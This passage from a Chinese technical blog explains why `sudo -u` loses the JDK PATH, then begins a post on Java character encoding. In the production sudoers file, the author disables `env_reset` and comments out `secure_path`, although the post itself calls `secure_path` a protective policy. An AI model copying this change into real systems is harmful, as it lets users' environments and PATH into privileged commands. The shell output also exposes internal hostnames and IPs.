<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@yd_app_api_02 ~]$ sudo -i  -u tomcat jstack 123</span><br><span class="line">123: No such process</span><br></pre></td></tr></table></figure>
<p>这次成功的找到了命令，区别在哪儿？</p>
<p>可以通过下面的命令查看环境变量：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@yd_app_api_02 ~]$ sudo -i -u tomcat env</span><br><span class="line">HOSTNAME=yd_app_api_02</span><br><span class="line">SHELL=/bin/bash</span><br><span class="line">TERM=xterm-256color</span><br><span class="line">HISTSIZE=1000</span><br><span class="line">USER=tomcat</span><br><span class="line">LS_COLORS=rs=0:di=38;5;27:ln=38;5;51:mh=44;38;5;15:pi=40;38;5;11:so=38;5;13:<span class="keyword">do</span>=38;5;5:bd=48;5;232;38;5;11:<span class="built_in">cd</span>=48;5;232;38;5;3:or=48;5;232;38;5;9:mi=05;48;5;232;38;5;15:su=48;5;196;38;5;15:sg=48;5;11;38;5;16:ca=48;5;196;38;5;226:tw=48;5;10;38;5;16:ow=48;5;10;38;5;21:st=48;5;21;38;5;15:ex=38;5;34:*.tar=38;5;9:*.tgz=38;5;9:*.arc=38;5;9:*.arj=38;5;9:*.taz=38;5;9:*.lha=38;5;9:*.lz4=38;5;9:*.lzh=38;5;9:*.lzma=38;5;9:*.tlz=38;5;9:*.txz=38;5;9:*.tzo=38;5;9:*.t7z=38;5;9:*.zip=38;5;9:*.z=38;5;9:*.Z=38;5;9:*.dz=38;5;9:*.gz=38;5;9:*.lrz=38;5;9:*.lz=38;5;9:*.lzo=38;5;9:*.xz=38;5;9:*.bz2=38;5;9:*.bz=38;5;9:*.tbz=38;5;9:*.tbz2=38;5;9:*.tz=38;5;9:*.deb=38;5;9:*.rpm=38;5;9:*.jar=38;5;9:*.war=38;5;9:*.ear=38;5;9:*.sar=38;5;9:*.rar=38;5;9:*.alz=38;5;9:*.ace=38;5;9:*.zoo=38;5;9:*.cpio=38;5;9:*.7z=38;5;9:*.rz=38;5;9:*.cab=38;5;9:*.jpg=38;5;13:*.jpeg=38;5;13:*.gif=38;5;13:*.bmp=38;5;13:*.pbm=38;5;13:*.pgm=38;5;13:*.ppm=38;5;13:*.tga=38;5;13:*.xbm=38;5;13:*.xpm=38;5;13:*.tif=38;5;13:*.tiff=38;5;13:*.png=38;5;13:*.svg=38;5;13:*.svgz=38;5;13:*.mng=38;5;13:*.pcx=38;5;13:*.mov=38;5;13:*.mpg=38;5;13:*.mpeg=38;5;13:*.m2v=38;5;13:*.mkv=38;5;13:*.webm=38;5;13:*.ogm=38;5;13:*.mp4=38;5;13:*.m4v=38;5;13:*.mp4v=38;5;13:*.vob=38;5;13:*.qt=38;5;13:*.nuv=38;5;13:*.wmv=38;5;13:*.asf=38;5;13:*.rm=38;5;13:*.rmvb=38;5;13:*.flc=38;5;13:*.avi=38;5;13:*.fli=38;5;13:*.flv=38;5;13:*.gl=38;5;13:*.dl=38;5;13:*.xcf=38;5;13:*.xwd=38;5;13:*.yuv=38;5;13:*.cgm=38;5;13:*.emf=38;5;13:*.axv=38;5;13:*.anx=38;5;13:*.ogv=38;5;13:*.ogx=38;5;13:*.aac=38;5;45:*.au=38;5;45:*.flac=38;5;45:*.mid=38;5;45:*.midi=38;5;45:*.mka=38;5;45:*.mp3=38;5;45:*.mpc=38;5;45:*.ogg=38;5;45:*.ra=38;5;45:*.wav=38;5;45:*.axa=38;5;45:*.oga=38;5;45:*.spx=38;5;45:*.xspf=38;5;45:</span><br><span class="line">SUDO_USER=qisheng.li</span><br><span class="line">SUDO_UID=1024</span><br><span class="line">USERNAME=tomcat</span><br><span class="line">PATH=/usr/<span class="built_in">local</span>/jdk/default/bin:/sbin:/bin:/usr/sbin:/usr/bin:/usr/<span class="built_in">local</span>/sbin:/home/tomcat/.<span class="built_in">local</span>/bin:/home/tomcat/bin</span><br><span class="line">MAIL=/var/spool/mail/tomcat</span><br><span class="line">PWD=/home/tomcat</span><br><span class="line">JAVA_HOME=/usr/<span class="built_in">local</span>/jdk/default</span><br><span class="line">LANG=en_US.UTF-8</span><br><span class="line">HISTCONTROL=ignoredups</span><br><span class="line">SHLVL=1</span><br><span class="line">SUDO_COMMAND=/bin/bash -c env</span><br><span class="line">HOME=/home/tomcat</span><br><span class="line">LOGNAME=tomcat</span><br><span class="line">CLASSPATH=.:/usr/<span class="built_in">local</span>/jdk/default/lib/dt.jar:/usr/<span class="built_in">local</span>/jdk/default/lib/tools.jar</span><br><span class="line">LESSOPEN=||/usr/bin/lesspipe.sh %s</span><br><span class="line">SUDO_GID=1024</span><br><span class="line">_=/bin/env</span><br></pre></td></tr></table></figure>
<p>可以看到<code>PATH</code>中包含了<code>/usr/local/jdk/default/bin</code>，这个是jdk的<code>bin</code>目录，所以<code>jstack</code>命令可以找到</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@yd_app_api_02 ~]$ sudo  -u tomcat env</span><br><span class="line">HOSTNAME=yd_app_api_02</span><br><span class="line">TERM=xterm-256color</span><br><span class="line">HISTSIZE=1000</span><br><span class="line">LS_COLORS=rs=0:di=38;5;27:ln=38;5;51:mh=44;38;5;15:pi=40;38;5;11:so=38;5;13:<span class="keyword">do</span>=38;5;5:bd=48;5;232;38;5;11:<span class="built_in">cd</span>=48;5;232;38;5;3:or=48;5;232;38;5;9:mi=05;48;5;232;38;5;15:su=48;5;196;38;5;15:sg=48;5;11;38;5;16:ca=48;5;196;38;5;226:tw=48;5;10;38;5;16:ow=48;5;10;38;5;21:st=48;5;21;38;5;15:ex=38;5;34:*.tar=38;5;9:*.tgz=38;5;9:*.arc=38;5;9:*.arj=38;5;9:*.taz=38;5;9:*.lha=38;5;9:*.lz4=38;5;9:*.lzh=38;5;9:*.lzma=38;5;9:*.tlz=38;5;9:*.txz=38;5;9:*.tzo=38;5;9:*.t7z=38;5;9:*.zip=38;5;9:*.z=38;5;9:*.Z=38;5;9:*.dz=38;5;9:*.gz=38;5;9:*.lrz=38;5;9:*.lz=38;5;9:*.lzo=38;5;9:*.xz=38;5;9:*.bz2=38;5;9:*.bz=38;5;9:*.tbz=38;5;9:*.tbz2=38;5;9:*.tz=38;5;9:*.deb=38;5;9:*.rpm=38;5;9:*.jar=38;5;9:*.war=38;5;9:*.ear=38;5;9:*.sar=38;5;9:*.rar=38;5;9:*.alz=38;5;9:*.ace=38;5;9:*.zoo=38;5;9:*.cpio=38;5;9:*.7z=38;5;9:*.rz=38;5;9:*.cab=38;5;9:*.jpg=38;5;13:*.jpeg=38;5;13:*.gif=38;5;13:*.bmp=38;5;13:*.pbm=38;5;13:*.pgm=38;5;13:*.ppm=38;5;13:*.tga=38;5;13:*.xbm=38;5;13:*.xpm=38;5;13:*.tif=38;5;13:*.tiff=38;5;13:*.png=38;5;13:*.svg=38;5;13:*.svgz=38;5;13:*.mng=38;5;13:*.pcx=38;5;13:*.mov=38;5;13:*.mpg=38;5;13:*.mpeg=38;5;13:*.m2v=38;5;13:*.mkv=38;5;13:*.webm=38;5;13:*.ogm=38;5;13:*.mp4=38;5;13:*.m4v=38;5;13:*.mp4v=38;5;13:*.vob=38;5;13:*.qt=38;5;13:*.nuv=38;5;13:*.wmv=38;5;13:*.asf=38;5;13:*.rm=38;5;13:*.rmvb=38;5;13:*.flc=38;5;13:*.avi=38;5;13:*.fli=38;5;13:*.flv=38;5;13:*.gl=38;5;13:*.dl=38;5;13:*.xcf=38;5;13:*.xwd=38;5;13:*.yuv=38;5;13:*.cgm=38;5;13:*.emf=38;5;13:*.axv=38;5;13:*.anx=38;5;13:*.ogv=38;5;13:*.ogx=38;5;13:*.aac=38;5;45:*.au=38;5;45:*.flac=38;5;45:*.mid=38;5;45:*.midi=38;5;45:*.mka=38;5;45:*.mp3=38;5;45:*.mpc=38;5;45:*.ogg=38;5;45:*.ra=38;5;45:*.wav=38;5;45:*.axa=38;5;45:*.oga=38;5;45:*.spx=38;5;45:*.xspf=38;5;45:</span><br><span class="line">MAIL=/var/spool/mail/qisheng.li</span><br><span class="line">LANG=en_US.UTF-8</span><br><span class="line">SHELL=/bin/bash</span><br><span class="line">PATH=/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="line">LOGNAME=tomcat</span><br><span class="line">USER=tomcat</span><br><span class="line">USERNAME=tomcat</span><br><span class="line">HOME=/home/tomcat</span><br><span class="line">SUDO_COMMAND=/bin/env</span><br><span class="line">SUDO_USER=qisheng.li</span><br><span class="line">SUDO_UID=1024</span><br><span class="line">SUDO_GID=1024</span><br></pre></td></tr></table></figure>
<p>没有<code>-i</code>的环境变量就没有<code>JDK</code>的路径。</p>
<p>看下<code>sudo</code>的man：</p>
<blockquote>
<p>-i [command]<br>​                The -i (simulate initial login) option runs the shell specified by the password database entry of the target user as a login shell.  This means that<br>​                login-specific resource files such as .profile or .login will be read by the shell.  If a command is specified, it is passed to the shell for execution<br>​                via the shell’s -c option.  If no command is specified, an interactive shell is executed.  sudo attempts to change to that user’s home directory before<br>​                running the shell.  The security policy shall initialize the environment to a minimal set of variables, similar to what is present when a user logs in.<br>​                The Command Environment section in the sudoers(5) manual documents how the -i option affects the environment in which a command is run when the sudoers<br>​                policy is in use.</p>
</blockquote>
<p><code>/etc/profile</code>的配置确实是全局的配置，但是这个只有在<code>login shell</code>的时候才会去<code>source</code>，才会生效。</p>
<p>关于集中类型的shell，可以查阅最后的参考链接，这里简单列出下：</p>
<img src="/2018/10/07/sudo-path/BashStartupFiles1-8918135.png">
<ul>
<li><strong>login</strong> shell: A login shell logs you into the system as a spiecified user, necessary for this is a username and password. When you hit ctrl+alt+F1 to login into a virtual terminal you get after successful login: a login shell (that is interactive). Sourced files:<ul>
<li><code>/etc/profile</code> and <code>~/.profile</code> for Bourne compatible shells (and <code>/etc/profile.d/*</code>)</li>
<li><code>~/.bash_profile</code> for bash</li>
<li><code>/etc/zprofile</code> and <code>~/.zprofile</code> for zsh</li>
<li><code>/etc/csh.login</code> and <code>~/.login</code> for csh</li>
</ul>
</li>
<li><strong>non-login</strong> shell: A shell that is executed without logging in, necessary for this is a current logged in user. When you open a graphic terminal in gnome it is a non-login (interactive) shell. Sourced files:<ul>
<li><code>/etc/bashrc</code> and <code>~/.bashrc</code> for bash</li>
</ul>
</li>
<li><strong>interactive</strong> shell: A shell (login or non-login) where you can interactively type or interrupt commands. For example a gnome terminal (non-login) or a virtual terminal (login). In an interactive shell the prompt variable must be set (<code>$PS1</code>). Sourced files:<ul>
<li><code>/etc/profile</code> and <code>~/.profile</code></li>
<li><code>/etc/bashrc</code> or <code>/etc/bash.bashrc</code> for bash</li>
</ul>
</li>
<li><strong>non-interactive</strong> shell: A (sub)shell that is probably run from an automated process you will see neither input nor outputm when the calling process don’t handle it. That shell is normally a non-login shell, because the calling user has logged in already. A shell running a script is always a non-interactive shell, but the script can emulate an interactive shell by prompting the user to input values. Sourced files:<ul>
<li><code>/etc/bashrc</code> or <code>/etc/bash.bashrc</code> for bash (but, mostly you see this at the beginning of the script: <code>[ -z &quot;$PS1&quot; ] &amp;&amp; return</code>. That means don’t do anything if it’s a non-interactive shell)</li>
<li>depending on shell; some of them read the file in the <code>$ENV</code> variable</li>
</ul>
</li>
</ul>
<h4 id="用sudo-i就好了？"><a href="#用sudo-i就好了？" class="headerlink" title="用sudo -i就好了？"></a>用<code>sudo -i</code>就好了？</h4><p>用<code>sudo -i</code>的问题是当前目录被更改了</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@yd_app_api_02 ~]$ sudo -i -u tomcat env | grep PWD --color</span><br><span class="line">PWD=/home/tomcat</span><br></pre></td></tr></table></figure>
<p>不注意的话就掉坑里了，明明当前目录有脚本却执行不了。</p>
<h4 id="更好的解决办法"><a href="#更好的解决办法" class="headerlink" title="更好的解决办法"></a>更好的解决办法</h4><p>执行sudo命令时，<code>PATH</code>之所以会改变，起始是一种安全策略，防止用户的路径污染sudo的路径</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">secure_path   Path used for every command run from sudo.  If you don&apos;t</span><br><span class="line">               trust the people running sudo to have a sane PATH environ‐</span><br><span class="line">               ment variable you may want to use this.  Another use is if</span><br><span class="line">               you want to have the “root path” be separate from the “user</span><br><span class="line">               path”.  Users in the group specified by the exempt_group</span><br><span class="line">               option are not affected by secure_path.  This option is not</span><br><span class="line">               set by default.</span><br></pre></td></tr></table></figure>
<p>看下我们线上机器的配置：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@yd_app_api_02 ~]$ sudo visudo</span><br><span class="line"></span><br><span class="line">Defaults    env_reset</span><br><span class="line">Defaults    env_keep =  <span class="string">"COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS"</span></span><br><span class="line">Defaults    env_keep += <span class="string">"MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE"</span></span><br><span class="line">Defaults    env_keep += <span class="string">"LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES"</span></span><br><span class="line">Defaults    env_keep += <span class="string">"LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE"</span></span><br><span class="line">Defaults    env_keep += <span class="string">"LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Adding HOME to env_keep may enable a user to run unrestricted</span></span><br><span class="line"><span class="comment"># commands via sudo.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Defaults   env_keep += "HOME"</span></span><br><span class="line"></span><br><span class="line">Defaults    secure_path = /sbin:/bin:/usr/sbin:/usr/bin</span><br></pre></td></tr></table></figure>
<p><code>secure_path = /sbin:/bin:/usr/sbin:/usr/bin</code>只设置了这些路径， 和我们在上面看到的输出一致。<code>JDK</code>的bin目录没有加入查找路径，所以找不到命令也就不奇怪了。</p>
<p>当然<code>env_keep</code>可以保留一些环境变量到sudo命令的环境中，但是无法保留<code>PATH</code>，做如下修改，就可以不重置环境变量：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">######## 第一处修改，这里取反，表示不重置环境变量</span></span><br><span class="line">Defaults    !env_reset</span><br><span class="line">Defaults    env_keep =  <span class="string">"COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS"</span></span><br><span class="line">Defaults    env_keep += <span class="string">"MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE"</span></span><br><span class="line">Defaults    env_keep += <span class="string">"LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES"</span></span><br><span class="line">Defaults    env_keep += <span class="string">"LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE"</span></span><br><span class="line">Defaults    env_keep += <span class="string">"LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Adding HOME to env_keep may enable a user to run unrestricted</span></span><br><span class="line"><span class="comment"># commands via sudo.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Defaults   env_keep += "HOME"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">######## 第二处修改</span></span><br><span class="line"><span class="comment">#Defaults    secure_path = /sbin:/bin:/usr/sbin:/usr/bin</span></span><br></pre></td></tr></table></figure>
<p>修改之后我们看看对应的环境变量：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@yd_app_api_01 ~]$ sudo -u tomcat env</span><br><span class="line">XDG_SESSION_ID=111674</span><br><span class="line">HOSTNAME=yd_app_api_01</span><br><span class="line">TERM=xterm-256color</span><br><span class="line">SHELL=/bin/bash</span><br><span class="line">HISTSIZE=1000</span><br><span class="line">SSH_CLIENT=47.97.217.12 35698 22</span><br><span class="line">SSH_TTY=/dev/pts/5</span><br><span class="line">USER=tomcat</span><br><span class="line">LS_COLORS=rs=0:di=38;5;27:ln=38;5;51:mh=44;38;5;15:pi=40;38;5;11:so=38;5;13:<span class="keyword">do</span>=38;5;5:bd=48;5;232;38;5;11:<span class="built_in">cd</span>=48;5;232;38;5;3:or=48;5;232;38;5;9:mi=05;48;5;232;38;5;15:su=48;5;196;38;5;15:sg=48;5;11;38;5;16:ca=48;5;196;38;5;226:tw=48;5;10;38;5;16:ow=48;5;10;38;5;21:st=48;5;21;38;5;15:ex=38;5;34:*.tar=38;5;9:*.tgz=38;5;9:*.arc=38;5;9:*.arj=38;5;9:*.taz=38;5;9:*.lha=38;5;9:*.lz4=38;5;9:*.lzh=38;5;9:*.lzma=38;5;9:*.tlz=38;5;9:*.txz=38;5;9:*.tzo=38;5;9:*.t7z=38;5;9:*.zip=38;5;9:*.z=38;5;9:*.Z=38;5;9:*.dz=38;5;9:*.gz=38;5;9:*.lrz=38;5;9:*.lz=38;5;9:*.lzo=38;5;9:*.xz=38;5;9:*.bz2=38;5;9:*.bz=38;5;9:*.tbz=38;5;9:*.tbz2=38;5;9:*.tz=38;5;9:*.deb=38;5;9:*.rpm=38;5;9:*.jar=38;5;9:*.war=38;5;9:*.ear=38;5;9:*.sar=38;5;9:*.rar=38;5;9:*.alz=38;5;9:*.ace=38;5;9:*.zoo=38;5;9:*.cpio=38;5;9:*.7z=38;5;9:*.rz=38;5;9:*.cab=38;5;9:*.jpg=38;5;13:*.jpeg=38;5;13:*.gif=38;5;13:*.bmp=38;5;13:*.pbm=38;5;13:*.pgm=38;5;13:*.ppm=38;5;13:*.tga=38;5;13:*.xbm=38;5;13:*.xpm=38;5;13:*.tif=38;5;13:*.tiff=38;5;13:*.png=38;5;13:*.svg=38;5;13:*.svgz=38;5;13:*.mng=38;5;13:*.pcx=38;5;13:*.mov=38;5;13:*.mpg=38;5;13:*.mpeg=38;5;13:*.m2v=38;5;13:*.mkv=38;5;13:*.webm=38;5;13:*.ogm=38;5;13:*.mp4=38;5;13:*.m4v=38;5;13:*.mp4v=38;5;13:*.vob=38;5;13:*.qt=38;5;13:*.nuv=38;5;13:*.wmv=38;5;13:*.asf=38;5;13:*.rm=38;5;13:*.rmvb=38;5;13:*.flc=38;5;13:*.avi=38;5;13:*.fli=38;5;13:*.flv=38;5;13:*.gl=38;5;13:*.dl=38;5;13:*.xcf=38;5;13:*.xwd=38;5;13:*.yuv=38;5;13:*.cgm=38;5;13:*.emf=38;5;13:*.axv=38;5;13:*.anx=38;5;13:*.ogv=38;5;13:*.ogx=38;5;13:*.aac=38;5;45:*.au=38;5;45:*.flac=38;5;45:*.mid=38;5;45:*.midi=38;5;45:*.mka=38;5;45:*.mp3=38;5;45:*.mpc=38;5;45:*.ogg=38;5;45:*.ra=38;5;45:*.wav=38;5;45:*.axa=38;5;45:*.oga=38;5;45:*.spx=38;5;45:*.xspf=38;5;45:</span><br><span class="line">MAIL=/var/spool/mail/qisheng.li</span><br><span class="line">PATH=/usr/<span class="built_in">local</span>/jdk/default/bin:/usr/<span class="built_in">local</span>/bin:/usr/bin:/usr/<span class="built_in">local</span>/sbin:/usr/sbin:/home/qisheng.li/.<span class="built_in">local</span>/bin:/home/qisheng.li/bin</span><br><span class="line">PWD=/home/qisheng.li</span><br><span class="line">JAVA_HOME=/usr/<span class="built_in">local</span>/jdk/default</span><br><span class="line">LANG=en_US.UTF-8</span><br><span class="line">HISTCONTROL=ignoredups</span><br><span class="line">SHLVL=1</span><br><span class="line">HOME=/home/tomcat</span><br><span class="line">LOGNAME=tomcat</span><br><span class="line">CLASSPATH=.:/usr/<span class="built_in">local</span>/jdk/default/lib/dt.jar:/usr/<span class="built_in">local</span>/jdk/default/lib/tools.jar</span><br><span class="line">SSH_CONNECTION=47.97.217.12 35698 192.168.2.11 22</span><br><span class="line">LESSOPEN=||/usr/bin/lesspipe.sh %s</span><br><span class="line">XDG_RUNTIME_DIR=/run/user/1025</span><br><span class="line">_=/usr/bin/sudo</span><br><span class="line">USERNAME=tomcat</span><br><span class="line">SUDO_COMMAND=/usr/bin/env</span><br><span class="line">SUDO_USER=qisheng.li</span><br><span class="line">SUDO_UID=1025</span><br><span class="line">SUDO_GID=1025</span><br></pre></td></tr></table></figure>
<p>可以看到<code>JAVA_HOME</code>和<code>PATH</code>都有了，这个和<code>qisheng.li</code>的环境变量是一致的，限于篇幅，这里就不贴出来了。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li><a href="http://feihu.me/blog/2014/env-problem-when-ssh-executing-command-on-remote/" rel="external nofollow noopener noreferrer" target="_blank">ssh连接远程主机执行脚本的环境变量问题</a></li>
<li><a href="https://unix.stackexchange.com/questions/170493/login-non-login-and-interactive-non-interactive-shells" rel="external nofollow noopener noreferrer" target="_blank">bash - login/non-login and interactive/non-interactive shells - Unix &amp; Linux Stack Exchange</a></li>
<li><a href="https://unix.stackexchange.com/questions/332948/how-does-lookup-in-path-work-under-the-hood" rel="external nofollow noopener noreferrer" target="_blank">shell - How does lookup in $PATH work under the hood? - Unix &amp; Linux Stack Exchange</a></li>
<li><a href="https://superuser.com/questions/927512/how-to-set-path-for-sudo-commands" rel="external nofollow noopener noreferrer" target="_blank">linux - How to set path for sudo commands - Super User</a></li>
<li><a href="http://perlchina.github.io/advent.perlchina.org/2009/SSHBatch.html" rel="external nofollow noopener noreferrer" target="_blank">http://perlchina.github.io/advent.perlchina.org/2009/SSHBatch.html</a>)</li>
</ol>
]]></content>
      
        <categories>
            
            <category> linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> sudo </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[java中encoding总结]]></title>
      <url>http://qsli.github.io/2018/08/12/java-encoding/</url>
      <content type="html"><![CDATA[<h1 id="URLConnection-乱码"><a href="#URLConnection-乱码" class="headerlink" title="URLConnection 乱码"></a>URLConnection 乱码</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">URL realUrl = <span class="keyword">new</span> URL(<span class="string">""</span>urlNameString<span class="string">""</span>);</span><br><span class="line">URLConnection connection = realUrl.openConnection();</span><br><span class="line">OutputStreamWriter out = <span class="keyword">new</span> OutputStreamWriter(connection  </span><br><span class="line">        .getOutputStream(), <span class="string">"UTF-8"</span>);</span><br></pre></td></tr></table></figure>
<p>在获取<code>OutputStreamWriter</code>需要指定编码格式， 否则使用的是默认的编码， 查看<code>OutputStreamWriter</code>的没有指定编码的构造函数:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Creates an OutputStreamWriter that uses the default character encoding.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  out  An OutputStream</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">OutputStreamWriter</span><span class="params">(OutputStream out)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>(out);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        se = StreamEncoder.forOutputStreamWriter(out, <span class="keyword">this</span>, (String)<span class="keyword">null</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (UnsupportedEncodingException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> Error(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>查看<code>StreamEncoder</code>的<code>forOutputStreamWriter</code>方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Factories for java.io.OutputStreamWriter</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> StreamEncoder <span class="title">forOutputStreamWriter</span><span class="params">(OutputStream out,</span></span></span><br><span class="line"><span class="function"><span class="params">                                                      Object lock,</span></span></span><br><span class="line"><span class="function"><span class="params">                                                      String charsetName)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> UnsupportedEncodingException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        String csn = charsetName;</span><br><span class="line">        <span class="keyword">if</span> (csn == <span class="keyword">null</span>)</span><br><span class="line">            csn = Charset.defaultCharset().name();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (Charset.isSupported(csn))</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> StreamEncoder(out, lock, Charset.forName(csn));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalCharsetNameException x) &#123; &#125;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> UnsupportedEncodingException (csn);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>可以看到， 如果没有传入编码名称，用的是默认的编码方式，这个<code>Charset.defaultCharset().name()</code>在windows上默认是<code>GBK</code>，这个可以在<code>JDK</code>启动的时候指定参数：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-Dfile.encoding=UTF-8</span><br></pre></td></tr></table></figure>
<h1 id="Tomcat乱码"><a href="#Tomcat乱码" class="headerlink" title="Tomcat乱码"></a>Tomcat乱码</h1><h2 id="URI编码"><a href="#URI编码" class="headerlink" title="URI编码"></a>URI编码</h2><p>指定为<code>UTF-8</code></p>
